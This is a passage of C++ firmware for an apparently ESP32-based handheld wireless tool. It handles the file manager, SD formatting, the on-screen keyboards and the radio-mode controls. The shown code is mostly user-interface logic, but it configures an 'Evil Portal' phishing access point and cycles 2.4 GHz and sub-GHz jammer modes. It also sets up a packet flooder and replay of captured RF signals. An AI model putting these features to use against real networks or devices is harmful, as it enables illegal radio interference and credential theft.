        if (lineLen >= maxCharsPerLine) {
            lineCount++;
            lineLen = 0;
        }
    }

    return max(1, lineCount);
}

bool loadTextFileForViewer(const String& path) {
    if (!validateSDReady(false) || !isTextFilePath(path)) {
        return false;
    }

    beginSPIOperation(true);
    File file = SD.open(path, FILE_READ);
    if (!file) {
        endSPIOperation(true, false);
        return false;
    }

    fileTextViewerContent = "";
    fileTextViewerScrollLine = 0;
    fileTextViewerLineCount = 0;
    fileTextViewerTruncated = false;

    const size_t maxChars = 2048;
    while (file.available()) {
        char c = (char)file.read();
        if (c == '\r') {
            continue;
        }

        if (fileTextViewerContent.length() >= maxChars) {
            fileTextViewerTruncated = true;
            break;
        }

        if (c == '\n' || c == '\t' || ((unsigned char)c >= 32 && (unsigned char)c <= 126)) {
            fileTextViewerContent += (c == '\t') ? ' ' : c;
        } else {
            fileTextViewerContent += ' ';
        }
    }

    file.close();
    endSPIOperation(false);

    if (fileTextViewerContent.length() == 0) {
        fileTextViewerContent = "(empty file)";
    }

    fileTextViewerLineCount = countWrappedTextViewerLines(fileTextViewerContent, 28);
    fileTextViewerActive = true;
    fileDetailPath = path;
    fileDetailSavedText = getSDEntrySavedText(path);
    return true;
}

void beginFileRename(const String& path) {
    int index = findFileManagerIndexByPath(path);
    if (index < 0) {
        return;
    }

    fileTextViewerActive = false;
    fileRenamePath = path;
    String leaf = fileManagerEntries[index];
    int dot = (!fileManagerIsDir[index]) ? leaf.lastIndexOf('.') : -1;

    if (dot > 0) {
        fileRenameDraft = leaf.substring(0, dot);
        fileRenameExtension = leaf.substring(dot);
    } else {
        fileRenameDraft = leaf;
        fileRenameExtension = "";
    }

    fileRenameDraft.trim();
    if (fileRenameDraft.length() == 0) {
        fileRenameDraft = "capture";
    }
    if (fileRenameDraft.length() > 16) {
        fileRenameDraft = fileRenameDraft.substring(0, 16);
    }

    fileRenameCursor = 0;
    fileRenameUppercase = true;
    fileRenameStatus = "";
    fileRenameStatusUntil = 0;
    currentScreen = SCREEN_FILE_RENAME;
    drawFileRenameScreen();
}

void handleSDFormatConfirmInput() {
    if (isPressed(BTN_LEFT)) {
        LOG("FORMAT confirm back");
        currentScreen = SCREEN_SUBMENU;
        currentMenuIndex = 2;
        drawSubMenu();
        delay(140);
        return;
    }

    if (isPressed(BTN_RIGHT) || isPressed(BTN_UP) || isPressed(BTN_DOWN)) {
        sdFormatConfirmEraseSelected = !sdFormatConfirmEraseSelected;
        drawSDFormatConfirmScreen();
    }

    if (isPressed(BTN_SELECT)) {
        if (!sdFormatConfirmEraseSelected) {
            LOG("FORMAT confirm cancel");
            currentScreen = SCREEN_SUBMENU;
            currentMenuIndex = 2;
            drawSubMenu();
            delay(140);
            return;
        }

        LOG("FORMAT confirm execute");
        tft.fillScreen(ILI9341_BLACK);
        drawStatusBar();
        tft.setTextSize(2);
        tft.setTextColor(ILI9341_WHITE);
        tft.setCursor(44, 80);
        tft.print("Formatting...");
        tft.setTextSize(1);
        tft.setTextColor(tft.color565(160, 160, 160));
        tft.setCursor(46, 104);
        tft.print("Deleting files...");
        // Progress bar outline
        tft.drawRect(20, 120, 200, 16, tft.color565(80,80,80));
        tft.fillRect(22, 122, 196, 12, tft.color565(30,30,30));

        // Progress callback — updates bar and log every 10 files
        static uint32_t lastProgressCount = 0;
        lastProgressCount = 0;
        setFormatProgressCallback([](uint32_t count) {
            if (count % 5 == 0) {
                // Animate bar (we don't know total, so use a bouncing fill)
                int barW = (int)((count % 197));  // cycles 0-196
                tft.fillRect(22, 122, 196, 12, tft.color565(30,30,30));
                tft.fillRect(22, 122, barW, 12, tft.color565(0, 180, 80));
                tft.fillRect(20, 140, 200, 12, ILI9341_BLACK);
                tft.setTextSize(1);
                tft.setTextColor(tft.color565(160,160,160));
                tft.setCursor(20, 140);
                tft.print("Deleted: "); tft.print(count); tft.print(" files");
                LOG("FORMAT progress: " + String(count) + " files deleted");
            }
        });

        bool ok = formatMountedSDCard();
        setFormatProgressCallback(nullptr);

        tft.fillScreen(ILI9341_BLACK);
        drawStatusBar();
        tft.setTextSize(2);
        tft.setTextColor(ILI9341_WHITE);
        tft.setCursor(ok ? 34 : 42, 126);
        tft.print(ok ? "Format Complete" : "Format Failed");
        tft.setTextSize(1);
        tft.setTextColor(tft.color565(160, 160, 160));
        tft.setCursor(ok ? 42 : 34, 150);
        tft.print(ok ? "Folders recreated" : "Check SD mount state");
        delay(700);

        currentScreen = SCREEN_SUBMENU;
        currentMenuIndex = 2;
        drawSubMenu();
    }
}

void handleFileManagerInput() {
    auto openFileManagerEntry = [&](int index, bool openDetails) {
        if (index < 0 || index >= fileManagerCount) {
            return;
        }

        // Handle selection mode for Evil Portal HTML
        if (fileManagerSelectMode && !fileManagerIsDir[index]) {
            String selectedPath = fileManagerFullPaths[index];
            String lowerPath = selectedPath;
            lowerPath.toLowerCase();
            
            if (fileManagerSelectFilter.length() == 0 || lowerPath.endsWith(fileManagerSelectFilter)) {
                // Save selected HTML path to preferences
                Preferences prefs;
                prefs.begin("evilportal", false);
                prefs.putString("htmlPath", selectedPath);
                prefs.end();
                
                // Show confirmation
                tft.fillScreen(ILI9341_BLACK);
                drawStatusBar();
                tft.setTextSize(2);
                tft.setTextColor(ILI9341_GREEN);
                tft.setCursor(20, 100);
                tft.print("HTML Selected!");
                tft.setTextSize(1);
                tft.setTextColor(tft.color565(160,160,160));
                tft.setCursor(20, 130);
                tft.print(selectedPath);
                delay(1500);
                
                // Exit selection mode and return to WiFi Settings
                fileManagerSelectMode = false;
                fileManagerSelectFilter = "";
                navigateBack();
                return;
            }
        }

        if (fileManagerMarkedCount > 0) {
            fileDeleteBatchMode = true;
            fileDeleteTargetPath = "";
            fileDeleteTargetCount = fileManagerMarkedCount;
            fileDeleteConfirmYes = true;
            LOG(String("DELETE confirm open batch: ") + fileDeleteTargetCount);
            currentScreen = SCREEN_FILE_DELETE_CONFIRM;
            drawFileDeleteConfirmScreen();
            return;
        }

        if (fileManagerIsDir[index]) {
            fileManagerPath = fileManagerFullPaths[index];
            loadFileManagerEntries();
            return;
        }

        String selectedPath = fileManagerFullPaths[index];
        String lowerPath = selectedPath;
        lowerPath.toLowerCase();

        if (isTextFilePath(selectedPath)) {
            if (openDetails) {
                fileTextViewerActive = false;
                fileDetailPath = selectedPath;
                fileDetailSavedText = getSDEntrySavedText(selectedPath);
                currentScreen = SCREEN_FILE_DETAIL;
                drawFileDetailScreen();
                return;
            }

            LOG(String("FILE .txt open: ") + selectedPath);
            if (loadTextFileForViewer(selectedPath)) {
                currentScreen = SCREEN_FILE_DETAIL;
                drawFileDetailScreen();
            } else {
                LOG("FILE .txt open failed");
            }
            return;
        }

        if (lowerPath.endsWith(".sub")) {
            if (openDetails) {
                LOG(String("FILE .sub details: ") + selectedPath);
                fileTextViewerActive = false;
                fileDetailPath = selectedPath;
                fileDetailSavedText = getSDEntrySavedText(selectedPath);
                currentScreen = SCREEN_FILE_DETAIL;
                drawFileDetailScreen();
                return;
            }

            LOG(String("FILE .sub load: ") + selectedPath);
            if (loadSubFileForTransmit(selectedPath)) {
                LOG("FILE .sub load ok");
                currentTitle = "RF";
                enterMode(RF_TRANSMIT);
                rfTransmitFirstDraw = true;
                rfTransmitActive = false;
                rfTransmitLastSendMs = 0;
                rfTransmitReturnToFileManager = true;
                rfTransmitCount = 0;
                rfTransmitSequence = 0;
                tft.fillScreen(ILI9341_BLACK);
                drawStatusBar();
            } else {
                LOG("FILE .sub load failed");
            }
            return;
        }

        fileTextViewerActive = false;
        fileDetailPath = selectedPath;
        fileDetailSavedText = getSDEntrySavedText(selectedPath);
        currentScreen = SCREEN_FILE_DETAIL;
        drawFileDetailScreen();
    };

    if (isPressed(BTN_UP) && fileManagerCount > 0) {
        fileManagerSelectedIndex--;
        if (fileManagerSelectedIndex < 0) fileManagerSelectedIndex = fileManagerCount - 1;
        fileManagerNeedsRedraw = true;
    }

    if (isPressed(BTN_DOWN) && fileManagerCount > 0) {
        fileManagerSelectedIndex++;
        if (fileManagerSelectedIndex >= fileManagerCount) fileManagerSelectedIndex = 0;
        fileManagerNeedsRedraw = true;
    }

    if (isPressed(BTN_LEFT)) {
        fileManagerSelectHoldStart = 0;
        fileManagerSelectHoldIndex = -1;
        fileManagerSelectHoldHandled = false;
        
        // Exit selection mode if active
        if (fileManagerSelectMode) {
            fileManagerSelectMode = false;
            fileManagerSelectFilter = "";
        }
        
        navigateBack();
        delay(140);
        return;
    }

    if (!sdMounted || sdError) {
        if (isPressed(BTN_SELECT)) {
            sdAutoMountRetryBlocked = false;
            sdError = false;
            if (mountSD(false, false, false, "FILE_MANAGER_REFRESH") || validateSDReady(true)) {
                loadFileManagerEntries();
            } else {
                fileManagerNeedsRedraw = true;
            }
            delay(140);
        }
        return;
    }

    if (isPressed(BTN_RIGHT) && fileManagerCount > 0) {
        fileManagerMarked[fileManagerSelectedIndex] = !fileManagerMarked[fileManagerSelectedIndex];
        fileManagerMarkedCount = 0;
        for (int i = 0; i < fileManagerCount; i++) {
            if (fileManagerMarked[i]) fileManagerMarkedCount++;
        }
        fileManagerNeedsRedraw = true;
        delay(140);
        return;
    }

    bool selectDown = (companion_readButtonState(BTN_SELECT) == LOW);
    if (selectDown && fileManagerCount > 0) {
        if (fileManagerSelectHoldStart == 0 || fileManagerSelectHoldIndex != fileManagerSelectedIndex) {
            fileManagerSelectHoldStart = millis();
            fileManagerSelectHoldIndex = fileManagerSelectedIndex;
            fileManagerSelectHoldHandled = false;
        }

        if (!fileManagerSelectHoldHandled &&
            fileManagerMarkedCount == 0 &&
            fileManagerSelectHoldIndex >= 0 &&
            fileManagerSelectHoldIndex < fileManagerCount &&
            !fileManagerIsDir[fileManagerSelectHoldIndex] &&
            (millis() - fileManagerSelectHoldStart) >= FILE_MANAGER_DETAIL_HOLD_MS) {
            fileManagerSelectHoldHandled = true;
            selectReleaseRequired = true;
            LOG(String("FILE hold details: ") + fileManagerFullPaths[fileManagerSelectHoldIndex]);
            openFileManagerEntry(fileManagerSelectHoldIndex, true);
            delay(140);
        }
        return;
    }

    if (fileManagerSelectHoldStart != 0) {
        int releasedIndex = fileManagerSelectHoldIndex;
        bool wasHandled = fileManagerSelectHoldHandled;
        unsigned long heldMs = millis() - fileManagerSelectHoldStart;
        fileManagerSelectHoldStart = 0;
        fileManagerSelectHoldIndex = -1;
        fileManagerSelectHoldHandled = false;

        if (!wasHandled && releasedIndex >= 0 && releasedIndex < fileManagerCount) {
            LOG(String("FILE release ms=") + heldMs + " path=" + fileManagerFullPaths[releasedIndex]);
            openFileManagerEntry(releasedIndex, false);
            delay(140);
        }
    }
}

void handleFileDetailInput() {
    int index = findFileManagerIndexByPath(fileDetailPath);

    if (isPressed(BTN_LEFT)) {
        navigateBack();
        delay(140);
        return;
    }

    if (fileTextViewerActive) {
        const int visibleLines = 12;
        int maxScroll = max(0, fileTextViewerLineCount - visibleLines);

        if (isPressed(BTN_UP)) {
            if (fileTextViewerScrollLine > 0) {
                fileTextViewerScrollLine--;
                drawFileDetailScreen();
            }
            delay(120);
            return;
        }

        if (isPressed(BTN_DOWN)) {
            if (fileTextViewerScrollLine < maxScroll) {
                fileTextViewerScrollLine++;
                drawFileDetailScreen();
            }
            delay(120);
            return;
        }

        if (isPressed(BTN_SELECT)) {
            fileTextViewerActive = false;
            drawFileDetailScreen();
            delay(140);
        }
        return;
    }

    if (index < 0) {
        return;
    }

    String lowPath = fileManagerFullPaths[index];
    lowPath.toLowerCase();
    
    if (isPressed(BTN_UP) && lowPath.endsWith(".sub") && sdMounted && !sdError) {
        if (orionToolsAppendFavoriteSubPath(fileManagerFullPaths[index].c_str())) {
            g_fileDetailToast = "Favorite saved";
            g_fileDetailToastUntil = millis() + 1800;
            drawFileDetailScreen();
        }
        delay(150);
        return;
    }

    if (isPressed(BTN_SELECT)) {
        beginFileRename(fileManagerFullPaths[index]);
        delay(140);
        return;
    }

    if (isPressed(BTN_RIGHT)) {
        fileDeleteBatchMode = false;
        fileDeleteTargetPath = fileManagerFullPaths[index];
        fileDeleteTargetCount = 1;
        fileDeleteConfirmYes = true;
        LOG(String("DELETE confirm open single: ") + fileDeleteTargetPath);
        currentScreen = SCREEN_FILE_DELETE_CONFIRM;
        drawFileDeleteConfirmScreen();
        delay(140);
    }
}

void handleFileRenameInput() {
    if (isPressed(BTN_LEFT)) {
        int nextIndex = moveFileRenameSelection(fileRenameCursor, -1, true);
        if (nextIndex != fileRenameCursor) {
            int previousIndex = fileRenameCursor;
            fileRenameCursor = nextIndex;
            redrawFileRenameSelection(previousIndex, fileRenameCursor);
        }
        delay(140);
        return;
    }

    if (isPressed(BTN_RIGHT)) {
        int nextIndex = moveFileRenameSelection(fileRenameCursor, 1, true);
        if (nextIndex != fileRenameCursor) {
            int previousIndex = fileRenameCursor;
            fileRenameCursor = nextIndex;
            redrawFileRenameSelection(previousIndex, fileRenameCursor);
        }
        delay(140);
        return;
    }

    if (isPressed(BTN_UP)) {
        int nextIndex = moveFileRenameSelection(fileRenameCursor, -fileRenameKeyCols, false);
        if (nextIndex != fileRenameCursor) {
            int previousIndex = fileRenameCursor;
            fileRenameCursor = nextIndex;
            redrawFileRenameSelection(previousIndex, fileRenameCursor);
        }
        delay(140);
        return;
    }

    if (isPressed(BTN_DOWN)) {
        int nextIndex = moveFileRenameSelection(fileRenameCursor, fileRenameKeyCols, false);
        if (nextIndex != fileRenameCursor) {
            int previousIndex = fileRenameCursor;
            fileRenameCursor = nextIndex;
            redrawFileRenameSelection(previousIndex, fileRenameCursor);
        }
        delay(140);
        return;
    }

    if (!isPressed(BTN_SELECT)) {
        return;
    }

    switch (fileRenameCursor) {
        case 38:
            if (fileRenameDraft.length() < 16) {
                fileRenameDraft += " ";
            }
            break;
        case 39:
            if (fileRenameDraft.length() > 0) {
                fileRenameDraft.remove(fileRenameDraft.length() - 1);
            }
            break;
        case 40:
            navigateBack();
            delay(140);
            return;
        case 41:
            commitFileRename();
            delay(160);
            return;
        case 42:
            fileRenameUppercase = !fileRenameUppercase;
            break;
        default:
            if (fileRenameCursor >= 0 && fileRenameCursor <= 37 && fileRenameDraft.length() < 16) {
                const char* label = getFileRenameKeyArray()[fileRenameCursor];
                if (label != nullptr && label[0] != '\0') {
                    fileRenameDraft += label[0];
                }
            }
            break;
    }

    if (fileRenameCursor == 42) {
        drawFileRenameScreen();
    } else {
        redrawFileRenameDraftArea();
    }
    delay(140);
}

// ===== EP RENAME FUNCTIONS =====
void redrawEPRenameDraftArea() {
    const uint16_t panel = tft.color565(18, 18, 18);
    const uint16_t border = tft.color565(60, 60, 60);
    
    tft.fillRoundRect(18, 70, 204, 30, 5, panel);
    tft.drawRoundRect(18, 70, 204, 30, 5, border);
    
    tft.setTextSize(2);
    String shown = epRenameDraft;
    if (shown.length() == 0) shown = "_";
    tft.setTextColor(ILI9341_WHITE);
    tft.setCursor(24, 78);
    tft.print(shown);
}

void redrawEPRenameKey(int index, bool selected) {
    if (index < 0 || index >= 48) return;
    
    const char** keys = epRenameUppercase ? fileRenameKeysUpper : fileRenameKeysLower;
    const char* label = keys[index];
    if (label == nullptr || label[0] == '\0') return;
    
    const int row = index / 8;
    const int col = index % 8;
    const int x = 18 + col * 26;
    const int y = 120 + row * 18;
    
    const uint16_t keyFill = tft.color565(28, 28, 28);
    const uint16_t keySelected = tft.color565(42, 42, 42);
    const uint16_t keyBorder = tft.color565(60, 60, 60);
    
    tft.fillRoundRect(x, y, 20, 14, 3, selected ? keySelected : keyFill);
    tft.drawRoundRect(x, y, 20, 14, 3, selected ? ILI9341_WHITE : keyBorder);
    
    tft.setTextSize(1);
    tft.setTextColor(ILI9341_WHITE);
    int16_t x1, y1;
    uint16_t w, h;
    tft.getTextBounds(label, 0, 0, &x1, &y1, &w, &h);
    int textX = x + ((20 - (int)w) / 2);
    int textY = y + ((14 - (int)h) / 2) + 1;
    tft.setCursor(textX, textY);
    tft.print(label);
}

void drawEPRenameScreen() {
    tft.fillScreen(ILI9341_BLACK);
    drawStatusBar();
    
    const uint16_t panel = tft.color565(18, 18, 18);
    const uint16_t border = tft.color565(60, 60, 60);
    const uint16_t textSoft = tft.color565(160, 160, 160);
    
    tft.setTextSize(2);
    tft.setTextColor(ILI9341_WHITE);
    tft.setCursor(18, 40);
    tft.print("Rename EP AP");
    
    redrawEPRenameDraftArea();
    
    // Draw keyboard
    for (int i = 0; i < 48; i++) {
        redrawEPRenameKey(i, i == epRenameCursor);
    }
}

void handleEPRenameInput() {
    static int prevCursor = -1;
    static unsigned long backPressStart = 0;
    static bool backHeld = false;
    
    // Reset prevCursor if we just entered the screen
    if (epRenameJustEntered) {
        prevCursor = -1;
        epRenameJustEntered = false;
    }
    
    // Handle BACK with long press on LEFT when not navigating
    if (digitalRead(BTN_LEFT) == LOW) {
        if (backPressStart == 0) {
            backPressStart = millis();
        } else if (!backHeld && (millis() - backPressStart > 800)) {
            // Long press detected - go back
            backHeld = true;
            prevCursor = -1; // Reset cursor tracking
            currentScreen = SCREEN_SUBMENU;
            drawSubMenu();
            delay(200);
            return;
        }
    } else {
        if (backPressStart > 0 && !backHeld && (millis() - backPressStart < 800)) {
            // Short press - navigate left
            int newCursor = epRenameCursor - 1;
            if (newCursor < 0) newCursor = 47;
            while (fileRenameKeysUpper[newCursor] == nullptr || fileRenameKeysUpper[newCursor][0] == '\0') {
                newCursor--;
                if (newCursor < 0) newCursor = 47;
            }
            if (prevCursor >= 0) redrawEPRenameKey(prevCursor, false);
            epRenameCursor = newCursor;
            redrawEPRenameKey(epRenameCursor, true);
            prevCursor = epRenameCursor;
            delay(140);
        }
        backPressStart = 0;
        backHeld = false;
    }
    
    if (isPressed(BTN_RIGHT)) {
        int newCursor = epRenameCursor + 1;
        if (newCursor > 47) newCursor = 0;
        while (fileRenameKeysUpper[newCursor] == nullptr || fileRenameKeysUpper[newCursor][0] == '\0') {
            newCursor++;
            if (newCursor > 47) newCursor = 0;
        }
        if (prevCursor >= 0) redrawEPRenameKey(prevCursor, false);
        epRenameCursor = newCursor;
        redrawEPRenameKey(epRenameCursor, true);
        prevCursor = epRenameCursor;
        delay(140);
        return;
    }
    
    if (isPressed(BTN_UP)) {
        int newCursor = epRenameCursor - 8;
        if (newCursor < 0) newCursor += 48;
        while (fileRenameKeysUpper[newCursor] == nullptr || fileRenameKeysUpper[newCursor][0] == '\0') {
            newCursor -= 8;
            if (newCursor < 0) newCursor += 48;
        }
        if (prevCursor >= 0) redrawEPRenameKey(prevCursor, false);
        epRenameCursor = newCursor;
        redrawEPRenameKey(epRenameCursor, true);
        prevCursor = epRenameCursor;
        delay(140);
        return;
    }
    
    if (isPressed(BTN_DOWN)) {
        int newCursor = epRenameCursor + 8;
        if (newCursor > 47) newCursor -= 48;
        while (fileRenameKeysUpper[newCursor] == nullptr || fileRenameKeysUpper[newCursor][0] == '\0') {
            newCursor += 8;
            if (newCursor > 47) newCursor -= 48;
        }
        if (prevCursor >= 0) redrawEPRenameKey(prevCursor, false);
        epRenameCursor = newCursor;
        redrawEPRenameKey(epRenameCursor, true);
        prevCursor = epRenameCursor;
        delay(140);
        return;
    }
    
    if (isPressed(BTN_SELECT)) {
        const char** keys = epRenameUppercase ? fileRenameKeysUpper : fileRenameKeysLower;
        
        switch (epRenameCursor) {
            case 38: // Space
                if (epRenameDraft.length() < 31) {
                    epRenameDraft += " ";
                    redrawEPRenameDraftArea();
                }
                break;
            case 39: // DEL
                if (epRenameDraft.length() > 0) {
                    epRenameDraft.remove(epRenameDraft.length() - 1);
                    redrawEPRenameDraftArea();
                }
                break;
            case 40: // BK
                prevCursor = -1; // Reset cursor tracking
                currentScreen = SCREEN_SUBMENU;
                drawSubMenu();
                delay(150);
                return;
            case 41: // OK
                epRenameDraft.trim();
                if (epRenameDraft.length() > 0) {
                    strncpy(epAPName, epRenameDraft.c_str(), 31);
                    epAPName[31] = '\0';
                    
                    // Save to preferences
                    Preferences prefs;
                    prefs.begin("evilportal", false);
                    prefs.putString("apName", String(epAPName));
                    prefs.end();
                    LOG(String("EP AP name saved: ") + epAPName);
                    
                    // Show confirmation
                    tft.fillScreen(ILI9341_BLACK);
                    drawStatusBar();
                    tft.setTextSize(2);
                    tft.setTextColor(ILI9341_GREEN);
                    tft.setCursor(40, 100);
                    tft.print("Saved!");
                    tft.setCursor(20, 130);
                    tft.setTextColor(ILI9341_CYAN);
                    tft.print(epAPName);
                    delay(2000);
                    
                    // Reset cursor tracking
                    prevCursor = -1;
                    
                    // Return to submenu
                    currentScreen = SCREEN_SUBMENU;
                    drawSubMenu();
                    delay(150);
                } else {
                    tft.fillRect(18, 292, 204, 12, ILI9341_BLACK);
                    tft.setTextSize(1);
                    tft.setTextColor(ILI9341_RED);
                    tft.setCursor(18, 294);
                    tft.print("Name cannot be empty");
                    delay(150);
                }
                return; // Important: return here to prevent further processing
            case 42: // aA (toggle case)
                epRenameUppercase = !epRenameUppercase;
                // Redraw all keys with new case
                for (int i = 0; i < 48; i++) {
                    redrawEPRenameKey(i, i == epRenameCursor);
                }
                break;
            default:
                if (epRenameCursor >= 0 && epRenameCursor <= 37 && epRenameDraft.length() < 31) {
                    const char* label = keys[epRenameCursor];
                    if (label != nullptr && label[0] != '\0') {
                        epRenameDraft += label[0];
                        redrawEPRenameDraftArea();
                    }
                }
                break;
        }
        
        delay(140);
    }
}

void handleFileDeleteConfirmInput() {
    if (isPressed(BTN_LEFT)) {
        LOG("DELETE confirm back");
        navigateBack();
        delay(140);
        return;
    }

    if (isPressed(BTN_UP) || isPressed(BTN_DOWN) || isPressed(BTN_RIGHT)) {
        fileDeleteConfirmYes = !fileDeleteConfirmYes;
        drawFileDeleteConfirmScreen();
        delay(140);
        return;
    }

    if (isPressed(BTN_SELECT)) {
        if (!fileDeleteConfirmYes) {
            LOG("DELETE confirm cancel");
            navigateBack();
            delay(140);
            return;
        }

        bool ok = true;
        if (fileDeleteBatchMode) {
            LOG(String("DELETE batch count: ") + fileManagerMarkedCount);
            if (!validateSDReady(false)) {
                ok = false;
                LOG("DELETE batch failed: SD not ready");
            } else {
                beginSPIOperation(true);
                for (int i = fileManagerCount - 1; i >= 0; i--) {
                    if (!fileManagerMarked[i]) {
                        continue;
                    }
                    if (!deleteSDEntryInternal(fileManagerFullPaths[i])) {
                        ok = false;
                    }
                }
                endSPIOperation(false);
            }
        } else {
            LOG(String("DELETE single path: ") + fileDeleteTargetPath);
            ok = deleteSDEntry(fileDeleteTargetPath, false);
        }

        validateSDReady(false);
        loadFileManagerEntries();
        currentScreen = SCREEN_FILE_MANAGER;
        fileManagerNeedsRedraw = true;
        restoreDisplayAfterHeavyStorageAccess();

        if (!ok) {
            tft.fillRect(12, 258, 216, 12, ILI9341_BLACK);
            tft.setTextColor(tft.color565(170, 170, 170));
            tft.setCursor(12, 258);
            tft.print("Delete failed");
        }
        delay(180);
    }
}

// ===== TOOL SCREEN INPUT =====

// RF Hold-R Tuning Helpers — shared by all RF modes, mirrors squelch opener
static bool rfIsRightHoldMode(unsigned long& startMs, unsigned long now) {
    bool held = (companion_readButtonState(BTN_RIGHT) == LOW);
    if (held && startMs == 0) startMs = now;
    if (!held) startMs = 0;
    return (held && startMs > 0 && (now - startMs > 300));
}
static bool rfShouldSuppressGlobalBack(RadioMode mode) {
    const bool rightHeld = (companion_readButtonState(BTN_RIGHT) == LOW);
    if (rightHeld) {
        switch (mode) {
            case RF_SCANNER:
            case RF_JAMMER:
            case RF_SQUELCH_ACTIVATE:
            case RF_FREQUENCY_SWEEP:
            case RF_MONITOR:
            case RF_ROLLING_CAPTURE:
            case RF_SIGNAL_CAPTURE:
            case RF_TRANSMIT:
            case RF_REPLAY:
                return true;
            default:
                break;
        }
    }
    return (mode == RF_SQUELCH_ACTIVATE && rfSquelchDigitEditActive);
}
static void rfStepFrequencyCoarse(float stepMHz) {
    rfLockedFrequencyMHz = floorf(rfLockedFrequencyMHz) + stepMHz;
    rfLockedFrequencyMHz = constrain(rfLockedFrequencyMHz, 300.0f, 928.0f);
}
static void rfCycleBandPresetBy(int dir) {
    rfBandIndex = (rfBandIndex + dir + rfBandPresetCount) % rfBandPresetCount;
    rfLockedFrequencyMHz = rfBandPresets[rfBandIndex].centerMHz;
}
static void rfStepFrequencyFine(float stepMHz) {
    rfLockedFrequencyMHz += stepMHz;
    rfLockedFrequencyMHz = constrain(rfLockedFrequencyMHz, 300.0f, 928.0f);
}

void handleToolInput() {

    // 🔥 SCANNER MODE (RESTORE CHANNEL CONTROL)
    if (currentRadioMode == RADIO_24_SCAN) {

        if (isPressed(BTN_UP)) {
            selectedChannel++;
            if (selectedChannel > 125) selectedChannel = 1;
        }

        if (isPressed(BTN_DOWN)) {
            selectedChannel--;
            if (selectedChannel < 1) selectedChannel = 125;
        }
    }

    // 🔥 ACTIVE MODE (MODE SWITCHING - ALL 5 OPTIONS)
    else if (currentRadioMode == RADIO_24_ACTIVE) {

        if (isPressed(BTN_SELECT)) {
            unsigned long currentTime = millis();
            if (currentTime - radio24JamLastButtonPress > jamDebounceDelay) {
                // Cycle: BLE → Bluetooth → WiFi → Drone → Carrier → Off → BLE
                switch(jammerMode) {
                    case DEACTIVE_MODE:
                        jammerMode = BLE_MODULE;
                        break;
                    case BLE_MODULE:
                        jammerMode = Bluetooth_MODULE;
                        break;
                    case Bluetooth_MODULE:
                        jammerMode = WIFI_MODULE;
                        break;
                    case WIFI_MODULE:
                        jammerMode = DRONE_MODULE;
                        break;
                    case DRONE_MODULE:
                        jammerMode = CONSTANT_CARRIER;
                        break;
                    case CONSTANT_CARRIER:
                        jammerMode = DEACTIVE_MODE;
                        break;
                }
                initializeJamRadios();
                radio24ActiveFirstDraw = true;
                radio24JamLastButtonPress = currentTime;
            }
        }
    }
    else if (currentRadioMode == RADIO_24_PACKET_FLOOD) {
        if (isPressed(BTN_SELECT)) {
            packetFlooderToggle = true;
            delay(200);
        }
    }
    else if (currentRadioMode == RF_SCANNER) {
        static unsigned long scanRightStart = 0;
        bool scanHold = rfIsRightHoldMode(scanRightStart, millis());

        if (scanHold) {
            if (isPressed(BTN_SELECT)) { rfStepFrequencyCoarse(1.0f);  resetRFSweepLevels(); delay(120); }
            if (isPressed(BTN_LEFT))   { rfStepFrequencyCoarse(-1.0f); resetRFSweepLevels(); delay(120); }
            if (isPressed(BTN_UP))     { rfCycleBandPresetBy(1);       resetRFSweepLevels(); delay(120); }
            if (isPressed(BTN_DOWN))   { rfCycleBandPresetBy(-1);      resetRFSweepLevels(); delay(120); }
        } else {
            if (isPressed(BTN_UP)) {
                rfLockedFrequencyMHz += 0.00625f;
                rfLockedFrequencyMHz = constrain(rfLockedFrequencyMHz, rfBandPresets[rfBandIndex].startMHz, rfBandPresets[rfBandIndex].endMHz);
                resetRFSweepLevels();
            }
            if (isPressed(BTN_DOWN)) {
                rfLockedFrequencyMHz -= 0.00625f;
                rfLockedFrequencyMHz = constrain(rfLockedFrequencyMHz, rfBandPresets[rfBandIndex].startMHz, rfBandPresets[rfBandIndex].endMHz);
                resetRFSweepLevels();
            }
            if (isPressed(BTN_SELECT)) {
                rfSweepPaused = !rfSweepPaused;
            }
        }
    }
    else if (currentRadioMode == RF_JAMMER) {
        static unsigned long jamRightStart = 0;
        bool jamHold = rfIsRightHoldMode(jamRightStart, millis());

        if (jamHold) {
            if (isPressed(BTN_SELECT)) { rfStepFrequencyCoarse(1.0f);  delay(120); }
            if (isPressed(BTN_LEFT))   { rfStepFrequencyCoarse(-1.0f); delay(120); }
            if (isPressed(BTN_UP))     { rfCycleBandPresetBy(1);       delay(120); }
            if (isPressed(BTN_DOWN))   { rfCycleBandPresetBy(-1);      delay(120); }
        } else {
            if (isPressed(BTN_UP))   rfStepFrequencyFine(0.00625f);
            if (isPressed(BTN_DOWN)) rfStepFrequencyFine(-0.00625f);
            if (isPressed(BTN_SELECT)) { rfJammerSweepMode = !rfJammerSweepMode; delay(200); }
        }
    }
    else if (currentRadioMode == RF_SQUELCH_ACTIVATE) {
        // Squelch handles all buttons internally in runRFSquelchActivate()
        // including consuming LEFT when RIGHT is held
    }
    else if (currentRadioMode == RF_FREQUENCY_SWEEP) {
        static unsigned long sweepRightStart = 0;
        bool sweepHold = rfIsRightHoldMode(sweepRightStart, millis());

        if (sweepHold) {
            if (isPressed(BTN_SELECT)) { rfStepFrequencyCoarse(1.0f);  resetRFSweepLevels(); delay(120); }
            if (isPressed(BTN_LEFT))   { rfStepFrequencyCoarse(-1.0f); resetRFSweepLevels(); delay(120); }
            if (isPressed(BTN_UP))     { rfCycleBandPresetBy(1);       resetRFSweepLevels(); delay(120); }
            if (isPressed(BTN_DOWN))   { rfCycleBandPresetBy(-1);      resetRFSweepLevels(); delay(120); }
        } else {
            if (isPressed(BTN_LEFT)) {
                navigateBack();
                delay(150);
                return;
            }
            if (isPressed(BTN_UP))   rfStepFrequencyFine(0.00625f);
            if (isPressed(BTN_DOWN)) rfStepFrequencyFine(-0.00625f);
            if (isPressed(BTN_SELECT)) rfSweepPaused = !rfSweepPaused;
        }
    }
    else if (currentRadioMode == RF_MONITOR) {
        static unsigned long monRightStart = 0;
        bool monHold = rfIsRightHoldMode(monRightStart, millis());

        if (monHold) {
            if (isPressed(BTN_SELECT)) { rfStepFrequencyCoarse(1.0f);  resetRFMonitorHistory(); delay(120); }
            if (isPressed(BTN_LEFT))   { rfStepFrequencyCoarse(-1.0f); resetRFMonitorHistory(); delay(120); }
            if (isPressed(BTN_UP))     { rfCycleBandPresetBy(1);       resetRFMonitorHistory(); delay(120); }
            if (isPressed(BTN_DOWN))   { rfCycleBandPresetBy(-1);      resetRFMonitorHistory(); delay(120); }
        } else {
            if (isPressed(BTN_UP))   rfStepFrequencyFine(0.00625f);
